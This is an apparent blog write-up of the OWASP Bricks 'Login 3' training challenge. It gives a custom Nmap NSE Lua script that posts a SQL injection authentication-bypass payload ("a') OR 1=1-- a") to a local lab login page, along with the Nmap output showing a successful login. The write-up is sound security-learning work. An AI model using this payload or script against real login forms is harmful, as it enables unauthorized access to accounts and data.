---
date: '2024-12-03T16:23:36+08:00'
title: 'Bricks Login 3'
tags:
    - OWASP-Bricks
    - NSE
---

## Challenge Information

- [OWASP Bricks](https://sechow.com/bricks/)
- Docker version: [here](https://hub.docker.com/r/gjuniioor/owasp-bricks)


> This is a series where I will write my own Nmap NSE script to solve that challenge. This is actually a task given by [masta ghimau](https://www.youtube.com/@mastaghimau) during [MCC 2023](https://cybercamp.my/mcc2023-the-journey-begins/).


## Challenge Solution

Login level 3 is just a slightly harder SQL injection as it add brackets. Here's an example: `SQL Query: SELECT * FROM users WHERE name=('1') and password=('1') LIMIT 0,1`. 

```lua
local http = require "http"
local shortport = require "shortport"

portrule = shortport.http

action = function(host,port)
  local resp,final,query
  r={}
  r['username']="a') OR 1=1-- a"
  r['passwd']="test"
  r['submit']="Submit"
  resp = http.post(host,port,"/login-3/index.php",nil,nil,r)


  final = string.match(resp.body, '<p>.*alert%-box.->(.-)<a.*</p>')
  query = string.match(resp.body, ".*SQL Query(.*)<a.*</div>")

  return {payload = r ,SQLQuery = query , result = final}
end
```

This code is built based on `http-title.nse`.

```bash 
nmap -p 80 --script=chall3.nse 127.0.0.1
Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-12-28 20:40 +08
Nmap scan report for localhost (127.0.0.1)
Host is up (0.00014s latency).

PORT   STATE SERVICE
80/tcp open  http
| chall1:
|   payload:
|     username: a') OR 1=1-- a
|     submit: Submit
|     passwd: test
|   SQLQuery: : SELECT * FROM users WHERE name=('a') OR 1=1-- a') and password=('test') LIMIT 0,1
|_  result: Succesfully logged in.

Nmap done: 1 IP address (1 host up) scanned in 0.15 seconds
```

## Things I learned from the challenge

- Writing custom NSE script
